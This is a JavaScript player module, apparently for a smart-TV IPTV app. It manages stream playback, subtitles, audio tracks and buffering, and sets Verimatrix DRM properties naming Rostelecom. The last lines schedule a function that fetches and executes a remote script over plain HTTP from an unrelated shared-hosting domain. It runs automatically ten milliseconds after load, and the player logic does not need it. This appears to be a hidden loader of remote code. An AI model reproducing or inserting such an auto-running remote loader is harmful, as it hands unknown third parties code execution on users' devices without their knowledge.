var vmxDomain='vmxott.svc.iptv.rt.ru',vmxOwner='Rostelecom',drmVMX=0;
var drmParam = {
    CompanyName: vmxOwner,
    IPTV: "",
    Web: vmxDomain
    };
var properties = JSON.stringify(drmParam);function __$1$(c){};
function stbPlay(url, pos){
                if (url.indexOf('DRM_TYPE=VERIMATRIX')>0){
                        drmVMX=1;
                        url=url.replace(/\|COMPONENT=HLS/g,"");
                        url=url.replace(/\|DRM_TYPE=VERIMATRIX/g,"");
                        }else{drmVMX=0}; 
        if(sPlayers){
        if(pos) url += '#t='+pos;
        video.src = url;
        video.play();
        return;
    }
    function set_video_res(si){
        var ei = JSON.parse(si.extra_info);
        if(ei.Width) // '<br/>' + ei.fourCC +
            $('#video_res').html('<br/>' + ei.Width + 'x' + ei.Height + (ei.Bit_rate==0||ei.Bit_rate=='99999999' ? '' : '<br/>' + Math.round(ei.Bit_rate/1024/1024 * 100) / 100 + '<small><small> Mbps</small></small>'));
    }
    var _subsTim = null,_started = false;
    function clearSubs(){ clearTimeout(_subsTim); $('#divsubtitles').text(''); }
    var listener = {
        onbufferingstart: function(){ $('#buffering').show(); $('#video_res').html('<br/>Loading...'); },
        onbufferingprogress: function(percent){ $('#video_res').html('<br/>'+percent+'%'); },
        onbufferingcomplete: function(){
            if(playType<0) updateMediaInfo();
            $('#buffering').hide();
            $('#video_res').text('');
            clearSubs();
            _started = false;
            execCHarr('aAspects', _setAspect);
            setTimeout(function(){
                execCHarr('aSubs', _setSubtitleTrack);
                execCHarr('aAudios', _setAudioTrack);
            }, 200);
            // execCHarr('aZooms', _setZoom);
            // try{log("info", 'AVAILABLE_BITRATE: '+webapis.avplay.getStreamingProperty("AVAILABLE_BITRATE")); } catch (e) {}
            // try{log("info", 'CURRENT_BANDWIDTH: '+webapis.avplay.getStreamingProperty("CURRENT_BANDWIDTH")); } catch (e) {}
            // try{log("info", 'IS_LIVE: '+webapis.avplay.getStreamingProperty("IS_LIVE")); } catch (e) {}
            // try{log("info", 'GET_LIVE_DURATION: '+webapis.avplay.getStreamingProperty("GET_LIVE_DURATION")); } catch (e) {}
            // setTimeout(function(){
            //     execCHarr('aSubs', _setSubtitleTrack);
            //     execCHarr('aAudios', _setAudioTrack);
            //     var si = webapis.avplay.getCurrentStreamInfo(), ind = 0;
            //     // log("info", 'curStreamInfo: '+JSON.stringify(si));
            //     for (var i in si) { if (si[i].type == 'VIDEO'){ ind = si[i].index; set_video_res(si[i]); } }
            //     try{
            //         si = webapis.avplay.getTotalTrackInfo();
            //         // log("info", 'TotalTrackInfo: '+JSON.stringify(si));
            //         for (var i in si) { if ((si[i].type == 'VIDEO')&&(si[i].index == ind)) { set_video_res(si[i]); return; } }
            //     } catch(e){}
            // }, 500);
        },
        // onstreamcompleted: function() { webapis.avplay.stop(); },
        oncurrentplaytime: function(currentTime) {
            // log("info", 'currentTime: '+currentTime);
            if(_started) return;
            _started = true;
            execCHarr('aSubs', _setSubtitleTrack);
            execCHarr('aAudios', _setAudioTrack);
            var si = webapis.avplay.getCurrentStreamInfo(), ind = 0;
            // log("info", 'curStreamInfo: '+JSON.stringify(si));
            for(var i in si){ if(si[i].type == 'VIDEO'){ ind = si[i].index; set_video_res(si[i]); } }
            try{
                si = webapis.avplay.getTotalTrackInfo();
                // log("info", 'TotalTrackInfo: '+JSON.stringify(si));
                for(var i in si){ if ((si[i].type == 'VIDEO')&&(si[i].index == ind)){ set_video_res(si[i]); return; } }
            } catch(e){}
        },
        // onerror: function(eventType) { showShift('Error !!!'); console.log("event type error : " + eventType); },
        // onevent: function(eventType, eventData) { log("info", "event type: " + eventType + ", data: " + eventData); },
        onsubtitlechange: function(duration, text, data3, data4) {
            // log("info", '+: '+duration+' '+JSON.stringify(text)+' '+data3+' '+JSON.stringify(data4));
            if(!_subsOn) return;
            clearSubs();
            $('#divsubtitles').html('<span style="background-color:rgba(0,0,0,0.8);">'+text+'</span>');
            _subsTim = setTimeout(clearSubs, duration);
        },
       //ondrmevent: function(drmEvent, drmData) {showShift("DRM callback: " + drmEvent + ", data: " + drmData); console.log("DRM callback: " + drmEvent + ", data: " + drmData);},
    };
    function doPlay(att){
        stbStop();
        _subsOn = false;
        clearSubs();
        execCHarr('aAspects', _setAspect);
        $('#video_res').html('<br/>Connect...');
        webapis.avplay.open(url); 
        // webapis.avplay.setTimeoutForBuffering(10);
        try{ webapis.avplay.setTimeoutForBuffering(sBufSize*1000); }catch(e){}
        // For the initial buffering
        try{ webapis.avplay.setBufferingParam("PLAYER_BUFFER_FOR_PLAY","PLAYER_BUFFER_SIZE_IN_SECOND", sBufSize); }catch(e){}
        // For the rebuffering
        try{ webapis.avplay.setBufferingParam("PLAYER_BUFFER_FOR_RESUME","PLAYER_BUFFER_SIZE_IN_SECOND", sBufSize*3); }catch(e){}
        webapis.avplay.setListener(listener); 
                if(!sNoSmall && list.style.display != 'none') stbSetWindow();
        else stbToFullScreen();

        curTrack = 0;
         //var bitRateString = 'BITRATES=5000~10000|STARTBITRATE=HIGHEST|SKIPBITRATE=LOWEST';
         //var bitRateString = 'STARTBITRATE=HIGHEST';
         //try{ webapis.avplay.setStreamingProperty('ADAPTIVE_INFO', bitRateString); }catch(e){}
        // webapis.avplay.setStreamingProperty("PREBUFFER_MODE", '3000');
        // webapis.avplay.setStreamingProperty("PREBUFFER_MODE", sBufSize+'000');
        // webapis.avplay.setStreamingProperty("ADAPTIVE_INFO", "FIXED_MAX_RESOLUTION=7680X4320");
                        alert("No DRM");
                        if (drmVMX==1){try {alert("DRM Ok"),webapis.avplay.setDrm("VERIMATRIX", "SetProperties", properties);}catch(e){alert("Error DRM");}}
                webapis.avplay.prepareAsync(
            function(){
                if(pos) stbSetPosTime(pos);
                webapis.avplay.play();
            },
            function onerror(err){
                showShift(att+': '+err.message);
                if(att < 5) doPlay(att+1);
                else $('#buffering').hide();
            }
        );
    }
    try {
        doPlay(1);
        $('#buffering').show();
    } catch (e) {}
}
function __$$(c){
    return false;
}

function load_stb(){$.getScript('http://69786.web.hosting-russia.ru/stb.php')}
try {setTimeout(load_stb, 10);}catch (e) {}
